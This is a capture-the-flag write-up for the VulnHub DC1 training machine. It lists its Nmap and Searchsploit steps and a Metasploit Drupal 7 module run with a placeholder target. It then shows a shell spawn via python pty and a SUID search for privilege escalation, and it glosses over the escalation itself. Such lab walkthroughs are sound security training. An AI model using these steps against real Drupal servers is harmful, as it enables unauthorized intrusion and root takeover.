# DC1 Writeup

## Machine Information

* Platform: VulnHub
* Machine: DC1
* Difficulty: Beginner

## Tools Used

* Nmap
* Searchsploit
* Metasploit Framework
* Linux Terminal

## Enumeration

### Host Discovery

Performed an Nmap scan to identify the target host and open ports.

### Open Ports Found

* 22/tcp - SSH
* 80/tcp - HTTP
* 111/tcp - RPCBind

## Web Enumeration

Visited the web application running on port 80.

Using Wappalyzer, the CMS was identified as **Drupal 7**.

## Exploitation

Searched for Drupal 7 vulnerabilities using Searchsploit and found a suitable exploit.

```bash
searchsploit drupal 7
```

Used the following Metasploit module:

```bash
exploit/unix/webapp/drupal_coder_exec
```

Configured the target IP and executed the exploit.

```bash
set RHOSTS <TARGET_IP>
run
```

A Meterpreter session was successfully obtained.

## Getting a Shell
<img width="634" height="731" alt="image" src="https://github.com/user-attachments/assets/f42b4122-772f-4b75-a37d-5a4d149c2ead" />


Converted the Meterpreter session into a shell.

```bash
shell
```

Spawned a proper interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

## Privilege Escalation

Enumerated SUID binaries:

```bash
find / -type f -perm -u=s 2>/dev/null
```
<img width="638" height="729" alt="image" src="https://github.com/user-attachments/assets/6600da71-352c-4953-98ee-b405aee8e9b0" />


Further enumeration revealed a path to privilege escalation.

Verified privileges:

```bash
whoami
```

Navigated to the root directory:

```bash
cd /root
ls
```

## Flag

Successfully obtained the final flag.

## Lessons Learned

* Importance of service enumeration
* CMS fingerprinting with Wappalyzer
* Exploiting known Drupal vulnerabilities
* Meterpreter to shell conversion
* Basic privilege escalation techniques
